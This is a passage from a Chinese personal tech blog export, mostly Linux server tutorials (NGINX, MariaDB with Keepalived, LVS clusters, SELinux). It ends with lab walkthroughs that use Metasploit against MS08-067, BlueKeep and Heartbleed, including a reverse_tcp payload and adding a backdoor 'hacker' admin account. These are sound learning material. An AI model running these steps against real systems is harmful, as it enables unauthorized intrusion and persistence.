安装NGINX\n\n如果是centos8版本的话，可以直接使用本地yum或者网络yum安装NGINX，对于8版本的就不在做过多赘述。\n\n主要针对Centos7版本做一下说明，因为Centos7的yum是不提供NGINX的，所以需要自己手动使用源码安装的方式进行安装。\n\n<!-- more -->\n\n[nginx源码包下载链接](https://pan.baidu.com/s/1hjUud-D1Du-s-dbFAGJxTQ?pwd=46k1)\n\n提取码：46k1\n\n* 解压源码包\n\n```bash\ntar -zxf nginx-1.17.10.tar.gz\n```\n\n* 安装相关的依赖\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel\n```\n\n* 执行configure脚本\n\n```bash\n./configure --prefix=/usr/local/nginx --with-http_ssl_module\n```\n\n* 再执行两步安装完成\n\n```bash\nmake\nmake install\n```\n\n此时NGINX的启动命令是在`/usr/local/nginx/sbin/nginx`里。\n\n直接执行这条命令可以启动NGINX\n\n```bash\n/usr/local/nginx/sbin/nginx\n```\n\n但是这个命令是在太长了，很不方便，我们可以拷贝一份到系统命令里面。\n\n```bash\ncp /usr/local/nginx/sbin/nginx /sbin/nginx\n```\n\n然后我们就可以愉快地使用一些简单的命令来对NGINX进行管理。\n\n```bash\nnginx # 启动nginx\nnginx -s reload # 重启nginx\nnginx -s stop # 关闭nginx\n```\n\n启动之后，可以通过80端口检查是否处于监听状态\n\n```bash\nlsof -i:80\n```\n\n再补充一点，就是关于NGINX的配置文件，源码安装的NGINX配置文件的路径`cd /usr/local/nginx/conf`里面很多我们不需要的内容，直接一条命令带走他们。\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n之后就很清爽了，开始配置吧少年。","tags":["Linux"],"categories":["技术"]},{"title":"Mariadb双主复制+Keepalived","url":"/2023/06/04/keepalived-linux/","content":"\n在最后的Linux高级课程的最后，完成了高可用负载均衡WEB服务器的搭建，比较贴合实际的生产环境，一共使用到了7台虚拟机，在我这个阶段，已经是我取得的最高成就了。感觉有必要记录下来，既是帮助后来者，也是方便自己日后进行复习总结。\n\n### 项目梗概\n\n项目一共设计7台虚拟机，其中2台作为调度机，进行对访问请求的分配；2台作为Nginx服务器；2台作为Mariadb数据库服务器；一台作为NFS储存服务器，负责存储Nginx服务器的网页资源。其逻辑拓扑图如下：\n\n<!-- more -->\n\n![拓扑图](./keepalived-linux/1.png)\n\n我会分几个部分来介绍这个项目的配置，本次先来介绍mariadb实现双主复制和keepalived。\n\n其中服务器的IP规划如下：\n\n|  主机名   |  角色  | 网卡名 |  模式  |       IP        |       VIP       |      网关       |\n| :-------: | :----: | :----: | :----: | :-------------: | :-------------: | :-------------: |\n| mariadb-1 | mst/slv  | ens224 | 仅主机 | 172.21.8.33/24  | 172.21.8.50/24  | 172.21.8.254/24 |\n| mariadb-2 | mst/slv  | ens224 | 仅主机 | 172.21.8.34/24  | 172.21.8.50/24  | 172.21.8.254/24 |\n\n\n### 数据库服务器的配置\n\n数据库服务器在本项目中采用双主复制的方式，来进行高可用的实现。\n\n#### 主从复制配置\n\n|  主机名   |    身份    | 网络接口 | 连接模式 |       IP       |\n| :-------: | :--------: | :------: | :------: | :------------: |\n| mariadb-1 |  主服务器  |  ens224  |  仅主机  | 172.21.8.33/24 |\n| mariadb-2 | 备份服务器 |  ens224  |  仅主机  | 172.21.8.34/24 |\n\n\n\n1. 首先在mariadb-1中进行软件的安装。\n\n```bash\nyum install -y mariadb-server\n```\n\n2. 修改配置文件。\n\n主配置文件`/etc/my.cnf`无需修改，修改`/etc/my.cnf.d/mariadb-server.cnf`文件，在[mysqld]段下面添加配置选项，开启二进制日志功能并设置server-id。\n\n```bash\nlog-bin = master.log\nserver-id = 11\n```\n\n3. 启动mariadb-1的mariadb服务\n\n```\nsystemctl start mariadb\n```\n\n4. 进入MySQL，作为主服务器创建授权账户slave，并查看主服务器装态。\n\n```bash\nmysql -u root\n```\n\n```bash\ngrant replication slave on *.* to 'slave'@'172.21.8.34' identified by '123';\n```\n\n>授权为对方的IP\n\n```bash\nshow master status;\n```\n\n![mariadb-1 master status](./keepalived-linux/3.png)\n\n`show master status;`之后，表格中的File字段和Position字段要留意，待会要用到。\n\n5. 在mariadb-2上安装软件，开启二进制日志功能，并启动服务。\n\n```bash\nlog-bin = slave.log\nserver-id = 12\n```\n\n6. 进入MySQL，开启复制功能。\n\n```bash\nmysql -u root\nchange master to master_host = '172.21.8.34',master_user = 'slave',master_password = '123',master_log_file = 'master.000002',master_log_pos = 712;\n```\n\nmaster_log_file字段填写mariadb-1`show master status`后的File内容，master_log_pos填写mariadb-1`show master status`后的Position内容。\n\n7. 在mariadb-2上查看slave状态。\n\n```\nstart slave;\nshow slave status \\G;\n```\n\n![mariadb-2 复制成功](./keepalived-linux/4.png)\n\n看到图中的两个yes，代表一边的复制功能就配置完成了。\n\n8. 然后在mariadb-2 服务器上也创建一个授权账户。\n\n```bash\ngrant replication slave on *.* to 'slave'@'172.21.8.33' identified by '123';\n```\n\n>授权为对方的IP\n\n```bash\nshow master status;\n```\n\n![mariadb-2 master status](./keepalived-linux/5.png)\n\n再次回到mariadb-1上，连接mariadb-2，实现复制功能。\n\n```\nchange master to master_host = '172.21.8.34',master_user = 'slave',master_password = '123',master_log_file = 'master.000003',master_log_pos = 338;\n```\n\n9. 配置完成后，开启slave功能，查看slave状态。\n\n```bash\nstart slave;\nshow slave status \\G;\n```\n\n![mariadb-1 复制成功](./keepalived-linux/6.png)\n\n到这里数据库的主从复制已经完成了，接下来要配置数据库的keepalived功能。\n\n#### keepalived配置\n\n1. 主机 DB-master 和 DB-slave 上安装 Keepalived\n\n```bash\nyum install -y keepalived\n```\n\n2. 把配置文件保留一个副本\n\n```\ncp /etc/keepalived/keepalived.conf{,.bak}\n```\n\n3. 修改两个主机上的配置文件/etc/keepalived/keepalived.conf\n\n|  主机名   | route_id  | vrrp_instance | state  | interface | virtual_router_id | priority | virtual_ipaddress |\n| :-------: | :-------: | :-----------: | :----: | :-------: | :---------------: | :------: | :---------------: |\n| mariadb-1 | db_master |  mariadb-ha   | BACKUP |  ens224   |        60         |   100    |  172.21.8.33/24   |\n| mariadb-2 | db_slave  |  mariadb-ha   | BACKUP |  ens224   |        60         |    90    |  172.21.8.34/24   |\n\n* mariadb-1 的`/etc/keepalived/keepalived.conf` 的内容如下 \n\n全局配置模块\n\n```bash\n! Configuration File for keepalived\n\nglobal_defs {\n   notification_email {\n     liuxp731@qq.com\t# 管理员邮箱\n   }\n   notification_email_from Alexandre.Cassen@firewall.loc\n   smtp_server 127.0.0.1\n   smtp_connect_timeout 30\n   router_id db_master\t# 标识\n   vrrp_skip_check_adv_addr\n   vrrp_strict\n   vrrp_garp_interval 0\n   vrrp_gna_interval 0\n}\n```\n\n启用 vrrp_script 模块， 定义对 mariadb 服务的监测\n\n```bash\nvrrp_script check_mariadb {\n   script \"/etc/keepalived/checkmariadb.sh\"\n   interval 2\n}\n```\n\nVRRPD 配置段  \n\n```bash\nvrrp_instance mariadb-ha {\n    state BACKUP\t# 备用\n    interface ens224\n    nopreempt\t\t# 设置不抢占\n    virtual_router_id 60\n    priority 100\t# 优先级\n    advert_int 1\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    track_script {\t# 配合vrrp_script段使用\n        check_mariadb\n    }\n    virtual_ipaddress {\t# 虚拟出的VIP\n        172.21.8.50/24\n    }\n}\n```\n\n* mariadb-2 的`/etc/keepalived/keepalived.conf` 的内容如下 \n\n全局配置段\n\n```bash\n! Configuration File for keepalived\n\nglobal_defs {\n   notification_email {\n     liuxp731@qq.com\n   }\n   notification_email_from Alexandre.Cassen@firewall.loc\n   smtp_server 127.0.0.1\n   smtp_connect_timeout 30\n   router_id db_slave\n   vrrp_skip_check_adv_addr\n   vrrp_strict\n   vrrp_garp_interval 0\n   vrrp_gna_interval 0\n}\n```\n\n启用 vrrp_script 模块， 定义对 mariadb 服务的监测\n\n```bash\nvrrp_script check_mariadb {\n   script \"/etc/keepalived/checkmariadb.sh\"\n   interval 2\n}\n```\n\nVRRPD 配置段\n\n```bash\nvrrp_instance mariadb-ha {\n    state BACKUP\n    interface ens224\n    virtual_router_id 60\n    priority 90\n    advert_int 1\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    track_script {\n        check_mariadb\n    }\n    virtual_ipaddress {\n        172.21.8.50/24\n    }\n```\n\n4. 在两个主机上编写服务检测脚本`/etc/keepalived/checkmariadb.sh`\n\n```bash\n#!/bin/bash\nif ! lsof -i:3306 &> /dev/null\nthen\n    systemctl stop keepalived\nfi\n```\n\n5. 启动两台服务器的`keepalived`\n\n```bash\nsystemctl start keepalived.service\n```\n\n![keepalived 配置成功](./keepalived-linux/7.png)\n\n可以看出mariadb-1主机已经多出来一个172.21.8.50/24的一个IP，这个就是虚拟出来的VIP，当mariadb-1主机宕掉，这个IP就会漂移到mariadb-2主机上，到这里就完成了mariadb双主复制和keepalived的实现。\n","tags":["Linux"],"categories":["技术"]},{"title":"EVE导入CENTOS8的镜像","url":"/2023/05/31/eve-import-img/","content":"\n最近做python的三级项目，需要在EVE里面使用服务器的节点，因为EVE是不自带相关镜像的，只能通过自己导入的方式，全网的教程层出不穷，在借鉴学习了几篇文章后，简明精要的做出一下总结。\n\n### 前期准备\n\n首先需要EVE的导入镜像，我只用到了CENTOS8的，[相关链接](https://pan.baidu.com/s/14OK6FP1sUPU5KDQHexRLbA) 放在了云盘里，提取码：0731，需要自取。虚拟机的`user`用户和`root`密码均为`Test123`。\n\n<!-- more -->\n\n### 操作步骤\n\n1. 使用文件传输工具将镜像导入到eve的虚拟机里面，上传路径为`/opt/unetlab/addons/qemu/`\n\n2. 接着使用命令解压这个文件\n\n```bash\ntar -xf linux-centos-8.tgz\n```\n\n3. 执行命令修正权限。\n\n```bash\n/opt/unetlab/wrappers/unl_wrapper -a fixpermissions\n```\n\n>修正权限我也不知道不进行这步会报什么错，我没进行这步也能正常使用，总之，如果没有进行这步，然后遇到什么问题，不妨回来补一下这个操作。\n\n4. 最后大功告成，在EVE网页中可以使用了(鼠标右击-->node-->linux-->image)。\n\n![导入成功](./eve-import-img/1.png)\n\n---\n\n### 补充\n\n应***汪某人***的需求（作为一名出色的博主，应该做到尽善尽美），再补充一点内容。\n\n* 首先是EVE连接时有一个很坑的点，虚拟机打开时提示默认用户名是`root`，密码是`eve`。但其实密码是不对的，密码是`cisco`。不清楚是不是因为版本的问题。总之，如果`eve`不好使，就换成`cisco`试试。\n\n* 连接工具大多数人使用的都是Xshell和XFTP，这两个工具确实非常不错，但是后来本人在逛github时，发现一个非常好用的工具，这个工具是免费开源的，并且集合了Xshell远程命令的功能和XFTP的文件传输功能，还有额外的CMD窗口。支持windows视窗化查看虚拟机的文件。截图如下，[链接在这](https://github.com/kingToolbox/WindTerm/releases/download/2.5.0/WindTerm_2.5.0_Windows_Portable_x86_64.zip) 。\n\n![windterm](./eve-import-img/2.png)\n\n","tags":["EVE"],"categories":["学习过程"]},{"title":"关于seliunx的学习过程","url":"/2023/05/24/seliunx/","content":"\n### 修改文件SELinux的上下文\n\n#### 实验目的：修改文件的selinux上下文标签，把`/home/student`目录的selinux上下文标签替换为`/root`目录的selinux上下文标签。\n\n * 查看student目录的selinux\n\n```bash\n[root@servera home]# ls -dZ student/\nunconfined_u:object_r:user_home_dir_t:s0 student/\n```\n\n<!-- more -->\n\n**user_home_dir_t**的部分就是`/home/student`的selinux的上下文。\n\n * 查看root目录的selinux\n\n```bash\n[root@servera /]# ls -Zd /root/\nsystem_u:object_r:admin_home_t:s0 /root/\n```\n\n**admin_home_t**的部分就是`/root`的selinux的上下文。\n\n* 修改命令\n\n```bash\n[root@servera /]# semanage fcontext -a -t admin_home_t '/home/student(/.*)?'\n```\n\n`'/home/student(/.*)?'`部分后面的`(/.*)?`是固定的。\n\n* 使配置生效\n\n```bash\n[root@servera /]# restorecon -RFvv /home/student/\nRelabeled /home/student from unconfined_u:object_r:user_home_dir_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_logout from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_profile from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bashrc from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh/known_hosts from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh/authorized_keys from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_history from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\n\n```\n\n* 再次查看student目录的selinux\n\n```bash\n[root@servera /]# ls -dZ /home/student/\nsystem_u:object_r:admin_home_t:s0 /home/student/\n```\n\n发现student目录的selinux值变成了**admin_home_t**。\n\n---","tags":["Linux"],"categories":["学习过程"]},{"title":"使用LVS+Nginx配置DR模式的Web集群","url":"/2023/05/18/LVS-Nginx-DR/","content":"\n### 准备工作\n\n需要最少准备三台虚拟机，关闭selinx和防火墙。\n\n||||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|:-:|\n|主机名|身份|网络接口|连接模式|IP地址|软件|\n|DS|调度服务器|ens224|仅主机|172.21.8.80/24|ipvsadm|\n|web1|真实服务器|ens224|仅主机|172.21.8.20/24|nginx|\n|web1|真实服务器|lo(VIP)|-|172.21.8.80/32|nginx|\n|web2|真实服务器|ens224|仅主机|172.21.8.30/24|nginx|\n|web2|真实服务器|lo(VIP)|-|172.21.8.80/32|nginx|\n\nPS:\n\n1. 建议DS（调度机）的网卡使用仅主机模式的。\n2. web1和web2的loopback网卡都要设置为DS主机的metric值大的那一张网卡。\n<!-- more -->\n3. 可以使用```route -n```查看**metric**值。\n4. **metric**值可以在网卡配置文件中修改，修改后记得重启网络服务生效。\n\n### DS主机配置\n\n```bash\nipvsadm -A -t 172.21.8.80:80 -s wrr\nipvsadm -a -t 172.21.8.80:80 -r 172.21.8.20:80 -g -w 1\nipvsadm -a -t 172.21.8.80:80 -r 172.21.8.30:80 -g -w 2\nipvsadm --set 1 1 1\n```\n\n调度策略中，前面的这个IP是调度机虚拟出来的VIP，后面的这个IP是真实Web服务器的IP地址。\n\n也可以直接编辑成一个脚本文件，方便后面进行策略的调整\n\n```bash\n#!/bin/bash\nipvsadm -C\nipvsadm -A -t 10.8.7.10:80 -s wrr\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.80:80 -g -w 1\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.81:80 -g -w 2\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.82:80 -g -w 1\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.83:80 -g -w 2\nipvsadm --set 1 1 1\necho \"轮巡策略已成功添加！！！\"\n```\n\n### Web1主机和Web2主机配置\n\n* 配置回环接口（VIP）\n\n```bash\nip addr add 172.21.8.80/32 dev lo\n```\n\n因为环回口配置的IP在每次重启之后都会丢失IP，每次配置起来也比较麻烦，同样的把他写成一个脚本\n\n```bash\n#!/bin/bash\nip addr add 10.8.7.10/32 dev lo:1\necho \"VIP 已经成功添加到loopback口。\"\n```\n\n* 修改Web1内核控制系统arp响应\n\n  因为要修改4个文件，设置的值也比较简单。只有在使用LVS+Nginx配置DR模式的时候才会将这4个文件设置为该值，平常使用要使用默认值。为了切换方便一点，建议使用脚本的方式。\n\n```bash\n#!/bin/bash\nif [ $# -ne 1 ]\nthen\n    echo 'error!'\"usage:$0 on|off\"\n    exit 1\nfi\ncase $1 in\n    on)\n        echo \"1\" > /proc/sys/net/ipv4/conf/lo/arp_ignore\n        echo \"2\" > /proc/sys/net/ipv4/conf/lo/arp_announce\n        echo \"1\" > /proc/sys/net/ipv4/conf/all/arp_ignore\n        echo \"2\" > /proc/sys/net/ipv4/conf/all/arp_announce\n        echo \"LVS DR 模式已开启！\"\n        ;;\n    off)\n        echo \"0\" > /proc/sys/net/ipv4/conf/lo/arp_ignore\n        echo \"0\" > /proc/sys/net/ipv4/conf/lo/arp_announce\n        echo \"0\" > /proc/sys/net/ipv4/conf/all/arp_ignore\n        echo \"0\" > /proc/sys/net/ipv4/conf/all/arp_announce\n        echo \"LVS DR 模式已关闭！\"\n        ;;\n    *)\n        echo 'error!'\"usage:$0 on|off\"\n        exit 1\nesac\n```\n\n* 执行脚本\n\n```bash\nchmod +x lvs_dr.sh\n./lvs_dr.sh on\n```\n\n### 测试\n\n1. 在Web1、Web2启动Nginx。\n2. 分别执行```curl 172.21.8.20```，```curl 172.21.8.30```。验证无误后，在客户端（第4台机器）上测试```curl 172.21.8.80```，使用**DR**机器是不好使的。\n\n>版权声明：以上的shell脚本知识产权由私人所有，禁止商用。","tags":["Linux"],"categories":["技术"]},{"title":"Linux使用小tips","url":"/2023/05/18/linux-tips/","content":"\n### 常用的一些操作\n\n1. 永久修改SELINUX值。\n\n使用虚拟机进行一些服务的配置的时候，如果SELINX的值不调整为permissive，经常会出现一些稀奇古怪的错误，如果每次都开机设置```setenforce 0```就太麻烦了。所以直接编辑```/etc/selinux/config```文件，设置```SELINUX=permissive```，最后保存退出。\n\n2. 永久修改网卡的IP地址。\n\n在平常的服务器的配置时，总是会涉及到IP的变动，我个人使用最多的方法是直接修改配置文件。\n\n<!-- more -->\n\n网卡配置文件```/etc/sysconfig/network-scripts/ifcfg-ens160```。分成几点来说。\n\n* BOOTPROTO=none，可选值还有static、dhcp、auto。none和static功能一样，dhcp和auto功能一样。\n\n* ONBOOT=yes，设置开机网卡自启的，建议设置为*yes*，可选值还有*no*\n\n* 如果网卡一开始是使用动态获取的，改成手动后，就要通过编辑配置文件来进行IP的设置。只需要在文件的末尾加上\n\n```bash\nIPADDR=192.168.20.10    # *设置IP*\nGATEWAY=192.168.20.254    # *设置网关*\nPREFIX=24    # *设置子网掩码*\n```\n\n有的配置文件还可以看到\n\n```bash\nDNS1=8.8.8.8\nDNS2=114.144.144.114\n```\n\n但是我并不建议大家在这里设置DNS，一是根本不会起什么作用，因为使用DNS的还有另一个配置文件（```/etc/resolv.conf```），二就是它会和```/etc/resolv.conf```文件指定的DNS相互冲突。\n\n* 更改完配置文件后，IP并不会马上改变。需要手动进行一下重启。个人总结出来的一些经验，命令执行的顺序建议都不要改变。\n\n```bash\nsystemctl restart NetworkManager\nnmcli c d ens160\nnmcli c up ens160\n```\n\n这样**3**条命令下来，旧IP再顽固，也会无奈变成配置文件中的IP。","tags":["Linux"],"categories":["小玩意儿"]},{"title":"新的Linux虚拟机快速基本配置","url":"/2023/05/18/linux-init/","content":"\n### 配置阿里yum源\n\n1. 首先保证虚拟机可以正常访问网络。\n2. 执行命令，下载yum源。(CENTOS-7)\n\n```bash\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo\n```\n\nCENTOS-8 yum源\n\n```bash\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo\n```\n\n<!-- more -->\n\n3. 清除yum缓存，重新生成。\n\n```bash\nyum clean all && yum makecache\n```\n\nPS:\n\n**CENTOS-7和CENTOS-8的yum源最好不要混着使用，是什么版本就用什么版本。**\n\n### 必备的软件\n\n1. **vim工具**，最小化环境是没有vim的，vim和vi的区别在最小化环境里表现的就是配置文档的高亮显示了，强烈建议安装vim。\n\n```bash\nyum install -y vim\n```\n\n2. **wget**工具，用来下载一些网络资源，同样最小化是没有的，所以要下载一个。\n\n```bash\nyum install -y wget\n```\n\n3. **bash-completion**包，从名字就可以看出来，这是用来命令补全的，简直不要太好用，<kbd>Tab</kbd>键爱好者狂喜。\n\n```bash\nyum install -y bash-completion\n``` \n\n4. **tree工具**，使用图形的方式展示目录下的文件结构，不用的时候吃灰也不会少，用的时候就知道这个的好处了。\n\n```bash\nyum install -y tree\n```\n\n6. **net-tools**，这个工具提供了比如`ifconfig`，`netstat`，`arp`，`route`命令，有时候用起来发现没有这个命令的话，记得安装这个包。\n\n```bash\nyum install -y net-tools\n```\n\n5. **lsof工具**，查看端口监听的常用工具，个人来讲使用频率高于`netstat`，使用也比较方便，可以安装一个。\n\n```bash\nyum install -y lsof\n```\n\n配置完这些，基础的东西就可以告一段落了。","tags":["Linux"],"categories":["小玩意儿"]},{"title":"使用LVS+Nginx配置NAT模式的Web集群","url":"/2023/05/17/LVS-Nginx-NAT/","content":"\n### 准备条件\n\n需要最少准备三台虚拟机，关闭selinx和防火墙。\n\n|||||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|\n|主机名|身份|网络接口|连接模式|IP地址|网关|软件|\n|DS|调度服务器|ens160|nat|192.168.20.40/24|192.168.20.254|ipvsadm|\n|DS|调度服务器|ens224|仅主机|172.21.8.10/24|-|ipvsadm|\n|web1|真实服务器|ens224|仅主机|172.21.8.20/24|172.21.8.10/24|nginx|\n|web2|真实服务器|ens224|仅主机|172.21.8.30/24|172.21.8.10/24|nginx|\n\nPS:\n\n1. DS一定是两块网卡，并且用一张网卡去作为真实服务器的网关。\n2. DS的两块网卡最好模式是不一样的。\n\n<!-- more -->\n\n### DS的配置\n\n下载ipvsadm\n\n```bash\nyum install -y ipvsadm\n```\n\n添加一个虚拟服务指定运输层协议为TCP、VIP为192.168.20.40、端口为80、调度算法为加权轮训。\n\n```bash\nipvsadm -A -t 192.168.20.40:80 -s rr\n```\n\n为虚拟服务器添加后端真实服务器\n\n```bash\nipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m\n```\n\n```bash\nipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m\n```\n\n使用命令查看生成的策略\n\n```bash\nipvsadm -Ln\n```\n\n开启路由转发功能\n\n```bash\necho \"1\" > /proc/sys/net/ipv4/ip_forward\n```\n\n使用命令修改轮训的时间\n\n```bash\nipvsadm --set 1 1 1\n```\n\n使用命令查看超时时间设置\n\n```bash\nipvsadm -L --timeout\n```\n\n### WEB1配置\n\n下载Nginx\n\n```bash\nyum install -y nginx\n```\n\nnginx的配置文件保存在```/etc/nginx/nginx.conf```\n\n使用命令去掉Nginx配置文件的空行和注释行\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n\n修改配置文件\n\n```bash\nworker_processes  1;\nevents {\n    worker_connections  1024;\n}\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       80;\n        server_name  172.21.8.20;    # 本机IP\n        location / {\n            root   /web;    # 根目录地址\n            index  index.html index.htm;    # 要去寻找的文件\n        }\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    }\n}\n```\n\n创建HTML资源文件\n\n```bash\nmkdir /web\n```\n\n编辑网页入口文件\n\n```bash\ntouch /web/index.html\necho \"web1111\" > /web/index.html\n```\n\n开启Nginx服务\n\n```bash\nnginx\n```\n\n验证服务开启\n\n```bash\nlsof -i:80\n```\n\n### WEB2配置\n\nweb2配置基本同web1。\n\n使用命令去掉Nginx配置文件的空行和注释行\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n\n修改配置文件\n\n```bash\nworker_processes  1;\nevents {\n    worker_connections  1024;\n}\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       80;\n        server_name  172.21.8.30;\n        location / {\n            root   /web;\n            index  index.html index.htm;\n        }\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    }\n}\n```\n\n创建HTML资源文件\n\n```bash\nmkdir /web\n```\n\n编辑网页入口文件\n\n```bash\ntouch /web/index.html\necho \"web2222\" > /web/index.html\n```\n\n开启Nginx服务\n\n```bash\nnginx\n```\n\n验证服务开启\n\n```bash\nlsof -i:80\n```\n\n### 测试\n\n先在web1主机\n\n```bash\ncurl 172.21.8.20\n```\n\n然后在web2主机\n\n```bash\ncurl 172.21.8.30\n```\n\n最后在DS主机上\n\n```bash\ncurl 192.168.20.40\n```\n\n如果观察到```web1111```和```web2222```来回显示在页面上则配置成功。\n\n### 其他可能用到的命令\n\nLinux查看路由表\n\n```bash\nip r s\n```\n\n重启Nginx的命令\n\n```bash\nnginx -s reload\n```\n\n关闭Nginx的命令\n\n```bash\nnginx -s stop\n```","tags":["Linux"],"categories":["技术"]},{"title":"CVE漏洞成功复现的玄学条件","url":"/2023/05/07/CVE-extend/","content":"\n### 正文\n\n总结一下漏洞复现得出来的几点体会，之前在永恒之黑文章里就已经提过几次了。\n\n但还是有两点得补充一下\n\n<!-- more -->\n\n1. 在被kali攻击过一次之后，倘若没有拿到meterpreter，这个时候一般第二次也不会成功的，即便你所有的操纵都是对的。这个时候一定要重启靶机的系统。\n\n2. 设置攻击参数的时候，一定要看好参数，尤其是系统存在两个网卡的，一定要看攻击机的IP是不是和靶机的IP在同一个网段的。","tags":["网络安全"],"categories":["技术"]},{"title":"远程命令执行（ms08-067）（CVE-2008-4250）","url":"/2023/04/23/ms08-067/","content":"\n### 准备工作\n\n攻击机：kali，差不多的版本都可以，我用的是Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux，可以使用命令```uname -a```查看。\n\n靶机：XP windows，下载链接，推荐使用电脑版的腾讯微云下载，这是目前我找到的最好用的ed2k的下载工具了。\n\n<!-- more -->\n\n```\ned2k://|file|sc_winxp_tablet_2005_CD1.iso|629227520|505B810E128351482AF8B83AC4D04FD2|/\n```\n\n### 域内扫描\n\n攻击第一步，先扫描网络内存活并可以利用的主机。\n\n```\nnmap -T4 -A -v -Pn 192.168.20.1/24\n```\n\n### 开始攻击\n\n1. 执行```msfconsole -q```。\n2. 搜索```ms08-067```。\n\n![开启工具](./ms08-067/1.png)\n\n3. 设置攻击前必要的参数。从上图看到，只有一个可用的模块。我们就使用这个模块。然后可以使用```show options```先查看都需要让我们设置哪些参数。\n\n![使用模块](./ms08-067/2.png)\n\n4. 设置参数。上图看到，我们需要设置```rhosts```（靶机IP）。\n\n![设置参数](./ms08-067/3.png)\n\n5. 然后设置payload reverse_tcp\n\n![设置参数](./ms08-067/4.png)\n\n6. 最后设置靶机的类型，在这我选择34。\n\n![设置参数](./ms08-067/5.png)\n\n7. 设置好就可以开始攻击了。\n\n![设置参数](./ms08-067/6.png)\n\n最后返回meterpreter，攻击成功。","tags":["网络安全"],"categories":["技术"]},{"title":"远程桌面提权（CVE-2019-0708）","url":"/2023/04/22/CVE-2019-0708/","content":"\n### 准备工作\n\n首先需要准备两台虚拟机，一台运行kali linux，另一台运行的是windows7，目标机开启3389端口,关闭防火墙，在计算机高级系统设置中远程桌面设置允许。\n\n### 开始攻击\n\n1. 还是使用我们熟悉的```msfconsole```工具,进入之后搜索***0708***。\n\n<!-- more -->\n\n![启动工具](./CVE-2019-0708/1.png)\n\n2. 使用编号是1的模块，然后设置***payload***，这是为了攻击成功之后不会蓝屏，而是给我们弹回一个```shell```。使用```options```查看需要设置的参数，从图中可以看到需要设置目标机器的IP。\n\n![启动工具](./CVE-2019-0708/2.png)\n\n3. 我们需要额外设置一个参数```targets```。使用```show targets```查看选项，选择最贴合我们情况的，我选择了windows的VMware。\n\n![启动工具](./CVE-2019-0708/3.png)\n\n4. 设置完就可以run起来了，稍作等待，成功返回```shell```,验证一下我们的权限，是系统用户没有错。\n\n![启动工具](./CVE-2019-0708/4.png)\n\n5. 我们尝试在系统中添加一个用户***hacker***，密码设置为“1234”。\n\n![启动工具](./CVE-2019-0708/5.png)\n\n6. 然后把***hacker***添加到管理员组。\n\n![启动工具](./CVE-2019-0708/6.png)\n\n7. 再启动一个终端，输入```rdesktop 192.168.20.130```，这里跟着的是目标机器的IP。然后kali会弹出一个新页面，就是windows的登录页面，我们使用刚刚创建的用户和密码登录。\n\n![启动工具](./CVE-2019-0708/7.png)\n\n8. 最后kali成功远程登录windows，任务完成。\n\n![启动工具](./CVE-2019-0708/8.png)","tags":["网络安全"],"categories":["技术"]},{"title":"心脏滴血原理与复现","url":"/2023/04/22/heartbleed/","content":"\n### 前期准备\n\n攻击机器还是kali，靶机这里用到的是[beebox](https://sourceforge.net/projects/bwapp/files/bee-box/)，下载完之后解压导入虚拟机就可以开始使用了。\n\n### nmap扫描\n\n攻击发起前，肯定是kali先进行扫描，查看同一网段哪些机器在线。\n\n<!-- more -->\n\n```bash\n  nmap -T4 -A -v -Pn 192.168.20.1/24\n```\n\n扫描完成后发现有一台192.168.20.136的机器在线，复现心脏滴血用到的端口是8443。\n\n![扫描结果](./heartbleed/1.png)\n\n### 脚本探测\n\n看到机器在线后，使用一个工具探测其8443端口是否可以利用，查看靶机是否有可以利用的机会。\n\n```bash\n  nmap 192.168.20.136 -p 8443 --script ssl-heartbleed.nse\n```\n\n文字显示是“VULNERABLE”，代表漏洞可以被利用。\n\n![脚本探测](./heartbleed/2.png)\n\n### 开始攻击\n\n打开```msfconsole```工具，搜索```heartbleed```，使用1。\n\n```bash\n  msfconsole -q\n  search heartbleed\n  use 1\n```\n\n![参数设置](./heartbleed/4.png)\n\n使用```show options```查看相应的参数并设置，包括```rport```，```rhost```，```verbose```。\n\n```bash\n  set rport 8443\n  set rhost 192.168.20.136\n```\n\n![参数设置](./heartbleed/5.png)\n\n![参数设置](./heartbleed/8.png)\n\n其中```verbose```是要在```show advanced```下查看的，默认是```false```，我们```set verpose true```设置为```true 